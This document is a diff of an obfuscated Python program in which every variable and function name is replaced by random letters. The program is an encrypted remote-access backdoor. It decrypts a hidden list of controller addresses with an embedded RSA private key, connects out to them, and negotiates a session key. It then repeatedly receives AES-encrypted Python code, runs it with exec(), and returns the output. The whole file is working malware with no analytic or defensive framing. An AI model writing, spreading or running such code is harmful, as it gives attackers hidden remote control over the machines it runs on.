@@ -19,19 +19,19 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 
 
 
-DGjgzRRSCTOJKXLO = []
-pFnDtbLUrvCmWXAB = []
+aISKBIdeJGqLfovgLDrlcwdwkjWU = []
+KVnoyzCuSVycNyyfNIAsEppguHTgJWXXDPYpehijTnvSP = []
 
-def uVNTNxuXKAjruadpTedjRQyYihTjUSooLHMwcwAH(sig, frame):
+def mKlUykBbBrsMAYwmXnvDqZGhVFsxvrXuXwCbJVmMzicQlflx(sig, frame):
 
-    for JouHQJiMYeeEKvqJucjwXiVdwJZlVUdZUeaDKs in DGjgzRRSCTOJKXLO:
-        JouHQJiMYeeEKvqJucjwXiVdwJZlVUdZUeaDKs.close()
+    for DGORYjxIsYlflGwHKTSrytzDqbYt in aISKBIdeJGqLfovgLDrlcwdwkjWU:
+        DGORYjxIsYlflGwHKTSrytzDqbYt.close()
 
     sys.exit(0)
 
-signal.signal(signal.SIGINT, uVNTNxuXKAjruadpTedjRQyYihTjUSooLHMwcwAH)
+signal.signal(signal.SIGINT, mKlUykBbBrsMAYwmXnvDqZGhVFsxvrXuXwCbJVmMzicQlflx)
 
-VmLrWptQJSxbMUFPH = """-----BEGIN RSA PUBLIC KEY-----
+NhTYbVljTcGTCdSTejRvUZ = """-----BEGIN RSA PUBLIC KEY-----
 MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
 Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
 9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
@@ -46,22 +46,22 @@ l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
 -----END RSA PUBLIC KEY-----
 """
 
-exfrRtEatDUkTFHcnifqkiKsGgRezHwjX = VmLrWptQJSxbMUFPH.encode('utf-8')
+HdYBeOIvzbsIMrPJUopkFjWmqkICGTzhXnfYsAB = NhTYbVljTcGTCdSTejRvUZ.encode('utf-8')
 
-dpMsFFujWhCAAGhFQDB = serialization.load_pem_public_key(exfrRtEatDUkTFHcnifqkiKsGgRezHwjX)
+usCxPKmGmKqfgeTVtVSNqIzipgj = serialization.load_pem_public_key(HdYBeOIvzbsIMrPJUopkFjWmqkICGTzhXnfYsAB)
 
-def pKvsMArhzMcwteMQKcWcIKIdNmDDKNrsbBbxVwZe(dpMsFFujWhCAAGhFQDB, BnBVkEPRWTEFYPyUCewbnSmBJCwvMM):
+def JezkWRawdTVuaWKNWZOtLqRL(usCxPKmGmKqfgeTVtVSNqIzipgj, EvOTuFzOgUGVxiUvWNDMdFDgHvEPcOgkIfY):
 
-    ooitjpPFDTWkHsyeLnlPDASjuIkDtxQExNXkhwmtHXg= dpMsFFujWhCAAGhFQDB.key_size
+    WcvEuhFhKwkFkKTRiltIPfvKYLAKSnBUrIXmiGcrTIbm= usCxPKmGmKqfgeTVtVSNqIzipgj.key_size
 
-    GJJwMaBVMwfbwWwIXJwtrpmwgzLiTceInfFYOdNybrSHV = (ooitjpPFDTWkHsyeLnlPDASjuIkDtxQExNXkhwmtHXg// 8 ) - 2 * hashes.SHA256().digest_size - 2
+    ySgRpbCSKDEubudzCzLyAZZfwZD = (WcvEuhFhKwkFkKTRiltIPfvKYLAKSnBUrIXmiGcrTIbm// 8 ) - 2 * hashes.SHA256().digest_size - 2
 
-    if len(BnBVkEPRWTEFYPyUCewbnSmBJCwvMM) > GJJwMaBVMwfbwWwIXJwtrpmwgzLiTceInfFYOdNybrSHV:
+    if len(EvOTuFzOgUGVxiUvWNDMdFDgHvEPcOgkIfY) > ySgRpbCSKDEubudzCzLyAZZfwZD:
         sys.exit(0)
 
     try:
-        pGmHekAPPQvfRRStfYetMHRdOZscdVLltnwi = dpMsFFujWhCAAGhFQDB.encrypt(
-            BnBVkEPRWTEFYPyUCewbnSmBJCwvMM,
+        htdFbbcqfoWRukXFL = usCxPKmGmKqfgeTVtVSNqIzipgj.encrypt(
+            EvOTuFzOgUGVxiUvWNDMdFDgHvEPcOgkIfY,
             padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
                 algorithm=hashes.SHA256(),
@@ -71,25 +71,25 @@ def pKvsMArhzMcwteMQKcWcIKIdNmDDKNrsbBbxVwZe(dpMsFFujWhCAAGhFQDB, BnBVkEPRWTEFYP
     except Exception as e:
         sys.exit(1)
 
-    OhzJSNfglNLlfdkSLOdO = base64.b64encode(pGmHekAPPQvfRRStfYetMHRdOZscdVLltnwi).decode('utf-8')
-    return OhzJSNfglNLlfdkSLOdO
+    BnTpPdvqehJVDMiXqkIzMx = base64.b64encode(htdFbbcqfoWRukXFL).decode('utf-8')
+    return BnTpPdvqehJVDMiXqkIzMx
 
 
-def tMXRiYSAoDUSBpCmKqQQKTQGswJuUonuwVZcPoZmrI(private_key_pem):
+def whKxqRbnbNQWXMcuraoAWh(private_key_pem):
 
-    YADnFeYHVZglPKYdQCbddoJvtUwVqIuTA = serialization.load_pem_private_key(
+    VNGkudTJPJLSYEWQbOSYEPqqMdqsLbUE = serialization.load_pem_private_key(
         private_key_pem,
         password=None,
     )
-    return YADnFeYHVZglPKYdQCbddoJvtUwVqIuTA
+    return VNGkudTJPJLSYEWQbOSYEPqqMdqsLbUE
 
 
-def mCJGmEBLPvalBZZkHbS(XePFwtokhdpfBplxMTjCntnZpjKFDhBcGrxOwPI, jMkMFwbxnbVHXqitBxTiWrbJjbqRtfNUClbJgKHF):
+def BqkMifdCedSVocFJSQpFBGtxzEXwKKKUeBPrW(vRXjEQXxuHrcipojXveeQpAbUSkUfuv, DGktjFIpCXhTCGWOQXinlrywshtOpJOqccyh):
     
-    BMvnGDuesCMZpMNWSPcpBJYyXiysSJzMpTYpHbiLtnwPCeDd = base64.b64decode(jMkMFwbxnbVHXqitBxTiWrbJjbqRtfNUClbJgKHF)
+    pVFDHEYoSyGazTxzrHemRuqf = base64.b64decode(DGktjFIpCXhTCGWOQXinlrywshtOpJOqccyh)
 
-    KfjctCcSMuWqTudmhXuDmQhgtbKcRRLwjmrePpJVXvWleAbi = XePFwtokhdpfBplxMTjCntnZpjKFDhBcGrxOwPI.decrypt(
-        BMvnGDuesCMZpMNWSPcpBJYyXiysSJzMpTYpHbiLtnwPCeDd,
+    cJAoXOfuhVOiWusrkXFMvLGnnfWvrHqMlJSPYmEkXm = vRXjEQXxuHrcipojXveeQpAbUSkUfuv.decrypt(
+        pVFDHEYoSyGazTxzrHemRuqf,
         padding.OAEP(
             mgf=padding.MGF1(algorithm=hashes.SHA256()),
             algorithm=hashes.SHA256(),
@@ -97,96 +97,96 @@ def mCJGmEBLPvalBZZkHbS(XePFwtokhdpfBplxMTjCntnZpjKFDhBcGrxOwPI, jMkMFwbxnbVHXqi
         )
     )
 
-    return KfjctCcSMuWqTudmhXuDmQhgtbKcRRLwjmrePpJVXvWleAbi.decode('utf-8')
+    return cJAoXOfuhVOiWusrkXFMvLGnnfWvrHqMlJSPYmEkXm.decode('utf-8')
 
 
 
-def URoWljeBlzyvqeHlrbINUMoTIxLrjRJTrb(NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ):
-    LSXzwOuRHISEKXEUBWXbQOXYxkEr = NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.recv(4096)
-    LSXzwOuRHISEKXEUBWXbQOXYxkEr = LSXzwOuRHISEKXEUBWXbQOXYxkEr.decode()
+def WyoAtSoCRTsJwPQHjFZFqcdpbArwGVFx(JiGCisnrhMhsdnglrtusyewb):
+    NgqynylaUiIMueleGgl = JiGCisnrhMhsdnglrtusyewb.recv(4096)
+    NgqynylaUiIMueleGgl = NgqynylaUiIMueleGgl.decode()
 
-    n, g = LSXzwOuRHISEKXEUBWXbQOXYxkEr.split(',')
+    n, g = NgqynylaUiIMueleGgl.split(',')
     n = int(n)
     g = int(g)
 
     x = random.randint(1, n - 1)
-    rwkoQCuVqGaMDjGpeIFEznDIMaWqAZaA = int(pow(g, x, n))
+    nvdLfgduxupEaOuaOTGUkDAkMDcSMWmBqHgqAtSnjNCWc = int(pow(g, x, n))
 
-    rwkoQCuVqGaMDjGpeIFEznDIMaWqAZaA = str(rwkoQCuVqGaMDjGpeIFEznDIMaWqAZaA)
-    NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.send(rwkoQCuVqGaMDjGpeIFEznDIMaWqAZaA.encode())
+    nvdLfgduxupEaOuaOTGUkDAkMDcSMWmBqHgqAtSnjNCWc = str(nvdLfgduxupEaOuaOTGUkDAkMDcSMWmBqHgqAtSnjNCWc)
+    JiGCisnrhMhsdnglrtusyewb.send(nvdLfgduxupEaOuaOTGUkDAkMDcSMWmBqHgqAtSnjNCWc.encode())
 
-    lYFBobmoEZeqXQNRlkwftnsJDXbTeFwFcvaRDVMn = NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.recv(4096)
-    lYFBobmoEZeqXQNRlkwftnsJDXbTeFwFcvaRDVMn = int(lYFBobmoEZeqXQNRlkwftnsJDXbTeFwFcvaRDVMn.decode())
+    bMJPGFbzMEuDPyjGpNvTMBPUCIdqwrjhgKfhluvyUfxI = JiGCisnrhMhsdnglrtusyewb.recv(4096)
+    bMJPGFbzMEuDPyjGpNvTMBPUCIdqwrjhgKfhluvyUfxI = int(bMJPGFbzMEuDPyjGpNvTMBPUCIdqwrjhgKfhluvyUfxI.decode())
 
-    UZjPMsXYLQVRlqaIAPFGGvk = pow(lYFBobmoEZeqXQNRlkwftnsJDXbTeFwFcvaRDVMn, x, n)
+    EDaNGxSvpOJUswfOR = pow(bMJPGFbzMEuDPyjGpNvTMBPUCIdqwrjhgKfhluvyUfxI, x, n)
 
-    oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA = int.to_bytes(UZjPMsXYLQVRlqaIAPFGGvk, length=(UZjPMsXYLQVRlqaIAPFGGvk.bit_length() + 7) // 8, byteorder='big')
-    oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA = hashlib.sha256(oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA).digest()
+    fYuBzmiWGNiNghUjlt = int.to_bytes(EDaNGxSvpOJUswfOR, length=(EDaNGxSvpOJUswfOR.bit_length() + 7) // 8, byteorder='big')
+    fYuBzmiWGNiNghUjlt = hashlib.sha256(fYuBzmiWGNiNghUjlt).digest()
 
-    return oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA
+    return fYuBzmiWGNiNghUjlt
 
 
-def RbVHKjGXGudhMgWHfrInrQeiDXoOjSHaBZfglCzvIE(sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq, JgGiPQoiFfcLzsElTYQSazMfTDeBtiBwXRUBkfAHsisA, xvwIpxolFfCsgHslVsOPZbRqbjYtdvOadYPnvvNlqUTnWsp):
+def NUIwqrbNAZPMhvYYqGQeEdFHJeIfbougdowarjJRi(IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc, EqOHKrtqZdidglBPxkGnqLmfUsVv, OEJHrtEkDjYRKkyYiHmUmuFGCqGdCF):
 
-    if (sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq) in pFnDtbLUrvCmWXAB:
+    if (IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc) in KVnoyzCuSVycNyyfNIAsEppguHTgJWXXDPYpehijTnvSP:
         return
 
-    NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    JiGCisnrhMhsdnglrtusyewb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    JiGCisnrhMhsdnglrtusyewb.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    DGjgzRRSCTOJKXLO.append(NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ)
+    aISKBIdeJGqLfovgLDrlcwdwkjWU.append(JiGCisnrhMhsdnglrtusyewb)
 
     try:
-        NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.connect((sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq))
-        pFnDtbLUrvCmWXAB.append((sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq))
+        JiGCisnrhMhsdnglrtusyewb.connect((IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc))
+        KVnoyzCuSVycNyyfNIAsEppguHTgJWXXDPYpehijTnvSP.append((IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc))
         
-        oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA = URoWljeBlzyvqeHlrbINUMoTIxLrjRJTrb(NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ)
+        fYuBzmiWGNiNghUjlt = WyoAtSoCRTsJwPQHjFZFqcdpbArwGVFx(JiGCisnrhMhsdnglrtusyewb)
 
-        NlbbYjaKHVzUrimSZSKZxRmTUBD = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
+        DwiJrUCdwzbpvvwgmnMrsOMNDHIMnlobBilRmPnyEl = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
         try:
-            PwiwViJOHgZiHmwxtTxItxC = QnTnWAfvXXvIEbmQjfWAGhpuL(oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA, NlbbYjaKHVzUrimSZSKZxRmTUBD.encode())
-            NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.send(PwiwViJOHgZiHmwxtTxItxC)
+            fFFfvHvyVBHXhcIdroeVcrUqTLtObbpFxbUCtEYcXE = mAeYeaaRXHwPlhNMcFzSlRsbscWcOWHXuZHqA(fYuBzmiWGNiNghUjlt, DwiJrUCdwzbpvvwgmnMrsOMNDHIMnlobBilRmPnyEl.encode())
+            JiGCisnrhMhsdnglrtusyewb.send(fFFfvHvyVBHXhcIdroeVcrUqTLtObbpFxbUCtEYcXE)
         except Exception as e:
             pass
 
-        pvefjfDNZZoCGWjHTJSAnOco = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
+        xQJFtPRLqRYvAszWgpDV = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
 
         try:
-            pvefjfDNZZoCGWjHTJSAnOco = QnTnWAfvXXvIEbmQjfWAGhpuL(oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA, pvefjfDNZZoCGWjHTJSAnOco.encode())
+            xQJFtPRLqRYvAszWgpDV = mAeYeaaRXHwPlhNMcFzSlRsbscWcOWHXuZHqA(fYuBzmiWGNiNghUjlt, xQJFtPRLqRYvAszWgpDV.encode())
         except Exception as e:
             pass
 
 
         while True:
 
-            NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.send(pvefjfDNZZoCGWjHTJSAnOco)
+            JiGCisnrhMhsdnglrtusyewb.send(xQJFtPRLqRYvAszWgpDV)
 
-            jyaHFPYQAuKRhkGSYOaD = NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.recv(4096)
+            RtlqTukIAcWknFhUoBZRYwuJCDFXTUpwWxYA = JiGCisnrhMhsdnglrtusyewb.recv(4096)
             try:
-                gzpAWWOVVotGJQZpbfUkWkpEWdbhEcHHDiriFD = lWlQjGgxOopXYBNUoOcQfQGOdyHeRRLstkez(oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA, jyaHFPYQAuKRhkGSYOaD)
+                VXBtkYtlxoFlfYrrtGwEIGbunemchBuShbkaX = EHESUrlHeXEvdyNRSlXXrlBzQg(fYuBzmiWGNiNghUjlt, RtlqTukIAcWknFhUoBZRYwuJCDFXTUpwWxYA)
             except Exception as e:
                 continue
 
-            XTuBALIcKqHwhLCmsoOsaN = sys.stdout
-            mrFoTMbBmQmmgsFEFDyvGYsyPcLPNbVVSSTi = io.StringIO()
-            sys.stdout = mrFoTMbBmQmmgsFEFDyvGYsyPcLPNbVVSSTi
+            XBYRaEtQVwaEuAKiuLTwhZrExxl = sys.stdout
+            ZxJOwjvlSNNnaepjxpTufSnrOsnkDiGAWUL = io.StringIO()
+            sys.stdout = ZxJOwjvlSNNnaepjxpTufSnrOsnkDiGAWUL
 
             try:
-                exec(gzpAWWOVVotGJQZpbfUkWkpEWdbhEcHHDiriFD)
-                ZjrYrwkVXbFzeYauXEnmvq = mrFoTMbBmQmmgsFEFDyvGYsyPcLPNbVVSSTi.getvalue()
-                if ZjrYrwkVXbFzeYauXEnmvq:
-                    print(ZjrYrwkVXbFzeYauXEnmvq)
-                elif ZjrYrwkVXbFzeYauXEnmvq == "":
-                    ZjrYrwkVXbFzeYauXEnmvq = "empty LSXzwOuRHISEKXEUBWXbQOXYxkEr"
+                exec(VXBtkYtlxoFlfYrrtGwEIGbunemchBuShbkaX)
+                gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN = ZxJOwjvlSNNnaepjxpTufSnrOsnkDiGAWUL.getvalue()
+                if gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN:
+                    print(gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN)
+                elif gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN == "":
+                    gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN = "empty NgqynylaUiIMueleGgl"
             except Exception as e:
-                ZjrYrwkVXbFzeYauXEnmvq = e
+                gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN = e
             finally:
-                sys.stdout = XTuBALIcKqHwhLCmsoOsaN
+                sys.stdout = XBYRaEtQVwaEuAKiuLTwhZrExxl
 
 
-            xuAzwiqwLixkxLtL = QnTnWAfvXXvIEbmQjfWAGhpuL(oolyWdmUsGoTJyNSVYFyPiKarCKihkuvrKbaA, ZjrYrwkVXbFzeYauXEnmvq.encode())
-            NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.send(xuAzwiqwLixkxLtL)
+            kpztexSYRRLhrJkDFRMuSLBmcpgMPqXGjXpIZKySbluLnwy = mAeYeaaRXHwPlhNMcFzSlRsbscWcOWHXuZHqA(fYuBzmiWGNiNghUjlt, gfDkwYEyUoXhokOPjGisokFIPbLfqUZIdWnnjCZXPN.encode())
+            JiGCisnrhMhsdnglrtusyewb.send(kpztexSYRRLhrJkDFRMuSLBmcpgMPqXGjXpIZKySbluLnwy)
 
             time.sleep(1)
 
@@ -195,40 +195,40 @@ def RbVHKjGXGudhMgWHfrInrQeiDXoOjSHaBZfglCzvIE(sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZY
         pass
 
     finally:
-        if (sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq) in pFnDtbLUrvCmWXAB:
-            pFnDtbLUrvCmWXAB.remove((sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq))
+        if (IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc) in KVnoyzCuSVycNyyfNIAsEppguHTgJWXXDPYpehijTnvSP:
+            KVnoyzCuSVycNyyfNIAsEppguHTgJWXXDPYpehijTnvSP.remove((IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc))
 
-        NOupzArrbTIUqCwUyhgmKbxUQsWKZEIkQ.close()
+        JiGCisnrhMhsdnglrtusyewb.close()
 
-def QnTnWAfvXXvIEbmQjfWAGhpuL(key, BecOJuIiDMMxgeQdtyERSIiUCRy):
-    GLRrEozeBSozFCedyImVXpMTZkwMZV = os.urandom(16)
-    AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfI = Cipher(algorithms.AES(key), modes.CBC(GLRrEozeBSozFCedyImVXpMTZkwMZV), backend=default_backend())
-    bKduJnTYGCJPOxsjSzJMphegofkIb = AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfI.encryptor()
+def mAeYeaaRXHwPlhNMcFzSlRsbscWcOWHXuZHqA(key, tIoSMAeKFEeqqQOZX):
+    zXKJlyFpuTvBJpXFSudthQRulSedKk = os.urandom(16)
+    hNHUktiZsaiugnQcbmbaMZzsGbOhktewN = Cipher(algorithms.AES(key), modes.CBC(zXKJlyFpuTvBJpXFSudthQRulSedKk), backend=default_backend())
+    lKKVwoMMrAjwgjxqsDMjNElrDtKdozZ = hNHUktiZsaiugnQcbmbaMZzsGbOhktewN.encryptor()
 
-    PMLQakUGyuZxgqDQOJCqOxOeeC = sym_padding.PKCS7(algorithms.AES.block_size).padder()
-    cFmTAdMtaaUYHUDnBYPPVaoibhh = PMLQakUGyuZxgqDQOJCqOxOeeC.update(BecOJuIiDMMxgeQdtyERSIiUCRy) + PMLQakUGyuZxgqDQOJCqOxOeeC.finalize()
+    bsuUyQAXdTAQgktDT = sym_padding.PKCS7(algorithms.AES.block_size).padder()
+    QRaEONnYYsBQcNcxskOMVXTLQWZuxSUKpCyhOPBoUBIHDaf = bsuUyQAXdTAQgktDT.update(tIoSMAeKFEeqqQOZX) + bsuUyQAXdTAQgktDT.finalize()
 
-    AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfItext = bKduJnTYGCJPOxsjSzJMphegofkIb.update(cFmTAdMtaaUYHUDnBYPPVaoibhh) + bKduJnTYGCJPOxsjSzJMphegofkIb.finalize()
-    return GLRrEozeBSozFCedyImVXpMTZkwMZV + AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfItext
+    hNHUktiZsaiugnQcbmbaMZzsGbOhktewNtext = lKKVwoMMrAjwgjxqsDMjNElrDtKdozZ.update(QRaEONnYYsBQcNcxskOMVXTLQWZuxSUKpCyhOPBoUBIHDaf) + lKKVwoMMrAjwgjxqsDMjNElrDtKdozZ.finalize()
+    return zXKJlyFpuTvBJpXFSudthQRulSedKk + hNHUktiZsaiugnQcbmbaMZzsGbOhktewNtext
 
-def lWlQjGgxOopXYBNUoOcQfQGOdyHeRRLstkez(key, OFZZcJebNhykXyOUTuwftrZPjkt):
-    GLRrEozeBSozFCedyImVXpMTZkwMZV = OFZZcJebNhykXyOUTuwftrZPjkt[:16]
-    AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfItext = OFZZcJebNhykXyOUTuwftrZPjkt[16:]
+def EHESUrlHeXEvdyNRSlXXrlBzQg(key, QmLnCrIhybqxrbwatNJuoPTlfTNhRxqqeFQMzBhvxhN):
+    zXKJlyFpuTvBJpXFSudthQRulSedKk = QmLnCrIhybqxrbwatNJuoPTlfTNhRxqqeFQMzBhvxhN[:16]
+    hNHUktiZsaiugnQcbmbaMZzsGbOhktewNtext = QmLnCrIhybqxrbwatNJuoPTlfTNhRxqqeFQMzBhvxhN[16:]
 
-    AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfI = Cipher(algorithms.AES(key), modes.CBC(GLRrEozeBSozFCedyImVXpMTZkwMZV), backend=default_backend())
-    zhQrIFJGjugpDrQjWOQFKsztkARnECm = AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfI.decryptor()
+    hNHUktiZsaiugnQcbmbaMZzsGbOhktewN = Cipher(algorithms.AES(key), modes.CBC(zXKJlyFpuTvBJpXFSudthQRulSedKk), backend=default_backend())
+    qGdzGbpWZBzvLenkkwkOdCinjxqaAALoBpO = hNHUktiZsaiugnQcbmbaMZzsGbOhktewN.decryptor()
 
-    nCPMfOrgbICFDAnsTmosWxcPDbsfwsr = zhQrIFJGjugpDrQjWOQFKsztkARnECm.update(AOsJOtLeBeltBILJpNXtfkRweTxPHjHstlSjKfItext) + zhQrIFJGjugpDrQjWOQFKsztkARnECm.finalize()
+    XNcUGNTeTbsmPodaJRAzpwwggkvJZseCpDofyceXJXVHtDz = qGdzGbpWZBzvLenkkwkOdCinjxqaAALoBpO.update(hNHUktiZsaiugnQcbmbaMZzsGbOhktewNtext) + qGdzGbpWZBzvLenkkwkOdCinjxqaAALoBpO.finalize()
 
-    vHkcyMitAjnSyaigYvNNtIjGFK = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
-    BecOJuIiDMMxgeQdtyERSIiUCRy = vHkcyMitAjnSyaigYvNNtIjGFK.update(nCPMfOrgbICFDAnsTmosWxcPDbsfwsr) + vHkcyMitAjnSyaigYvNNtIjGFK.finalize()
+    VDatcHRHewqBSZzrLZ = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
+    tIoSMAeKFEeqqQOZX = VDatcHRHewqBSZzrLZ.update(XNcUGNTeTbsmPodaJRAzpwwggkvJZseCpDofyceXJXVHtDz) + VDatcHRHewqBSZzrLZ.finalize()
 
-    return BecOJuIiDMMxgeQdtyERSIiUCRy.decode('utf-8')
+    return tIoSMAeKFEeqqQOZX.decode('utf-8')
 
 
 if __name__ == "__main__":
 
-    gSZmuTBfWfAchqPqjXVnmdz = """-----BEGIN RSA PRIVATE KEY-----
+    vwJYnbvoJUQyGTVPIYlmhStqVpsqByx = """-----BEGIN RSA PRIVATE KEY-----
 MIIJJwIBAAKCAgEAgXo2xft+mNWePtIJL+AoyMlWW7wzf8pRp5886z8Y8vkSHFLA
 VMT/bAmP56a3B5YEJ2xWIxwRArCWqkY3N/vxMpo3jHmOMw/Kb6ODB0Q2ocfT1yzA
 eJJPMlhb6gTxH4wdsqsxWbKmX0zqF08Q1NJ07j84KU/ACGi1vgyFiI5M4ON1AOxY
@@ -281,21 +281,21 @@ yUrU2hkths4bxCwx+jeyI0LZYBaoryhcQzKWY1Gb78NGVm9dKye0nmlVvw==
 -----END RSA PRIVATE KEY-----
 """.encode()
 
-    XePFwtokhdpfBplxMTjCntnZpjKFDhBcGrxOwPI = tMXRiYSAoDUSBpCmKqQQKTQGswJuUonuwVZcPoZmrI(gSZmuTBfWfAchqPqjXVnmdz)
+    vRXjEQXxuHrcipojXveeQpAbUSkUfuv = whKxqRbnbNQWXMcuraoAWh(vwJYnbvoJUQyGTVPIYlmhStqVpsqByx)
 
-    alQQDlnTOXyHWskkU = "KVYasIQk8akkOdpVFbRR4QLgXb8kM2SMB/Ma3waDa+mGFICLA8uaa+EmvjA8lhWTjiJe+92MixIVSTa3Hu5AJe8C9HwbSyQ7uoEZ2ymwybLuRAdhj3rNbQbekw+sAQmfZH1Ay0wLfi4OXWfNgPobiokd/p3DssmfL5DsQOXlTS/8dXsRTZEuuGTDCS7CPQQV8CksOvFL1/JfSLpyuNPFz28pGgJTpk1QLnvjs/yrcLXXB9hVrAGS+g9ipa5s5DKUNmmcUYEas4KPuSmY4pKWACO7YRoU9iPHueaMQfxx1ZQNDYBkqED14PNOkDx/sWVttMmfdwVZh/nFRcL9kAKrJSmwk9kTQ/GjURWlxVduYuH0rcWIQHUzemyw42atYmDq6+UkT1jn5yrn0QQbLoppU9j7CSdjOUZXXLIb7myZoUq/3OG+qqFORG2a9LC9QuIWg+IFcnsH6zbAV9ga6aiRLRImMqfgrsCYPKVJTMv193hqOeItx1oK9+23FSK0Bi93XmqtkiHUx7gavC+OAa7L4ka7Z8IH0mg7k6yQi+1VJCcULcy30jTW1d9NL/EypnZBA+xC6fuBBDxQLs/96clmaBB+Z39qyxgQc0ddb0lto/0XrtZVI12RLqf4rkD2K8buKT264td/3X9aNHJuuFivVRfb/AO6OcoudnA6K21yMeA="
-    BtdVRkMzvPrLESQlLNY = mCJGmEBLPvalBZZkHbS(XePFwtokhdpfBplxMTjCntnZpjKFDhBcGrxOwPI, alQQDlnTOXyHWskkU).rstrip('\n')
-    OVdLPzABCfMgosFRKICOHczcHgKRCcbCexZfKSnX = BtdVRkMzvPrLESQlLNY.split(',')
+    YcdOOBtSPeKIyLwxZWOXQLZTSpyHggVBspkXoKWUbvMPD = "KVYasIQk8akkOdpVFbRR4QLgXb8kM2SMB/Ma3waDa+mGFICLA8uaa+EmvjA8lhWTjiJe+92MixIVSTa3Hu5AJe8C9HwbSyQ7uoEZ2ymwybLuRAdhj3rNbQbekw+sAQmfZH1Ay0wLfi4OXWfNgPobiokd/p3DssmfL5DsQOXlTS/8dXsRTZEuuGTDCS7CPQQV8CksOvFL1/JfSLpyuNPFz28pGgJTpk1QLnvjs/yrcLXXB9hVrAGS+g9ipa5s5DKUNmmcUYEas4KPuSmY4pKWACO7YRoU9iPHueaMQfxx1ZQNDYBkqED14PNOkDx/sWVttMmfdwVZh/nFRcL9kAKrJSmwk9kTQ/GjURWlxVduYuH0rcWIQHUzemyw42atYmDq6+UkT1jn5yrn0QQbLoppU9j7CSdjOUZXXLIb7myZoUq/3OG+qqFORG2a9LC9QuIWg+IFcnsH6zbAV9ga6aiRLRImMqfgrsCYPKVJTMv193hqOeItx1oK9+23FSK0Bi93XmqtkiHUx7gavC+OAa7L4ka7Z8IH0mg7k6yQi+1VJCcULcy30jTW1d9NL/EypnZBA+xC6fuBBDxQLs/96clmaBB+Z39qyxgQc0ddb0lto/0XrtZVI12RLqf4rkD2K8buKT264td/3X9aNHJuuFivVRfb/AO6OcoudnA6K21yMeA="
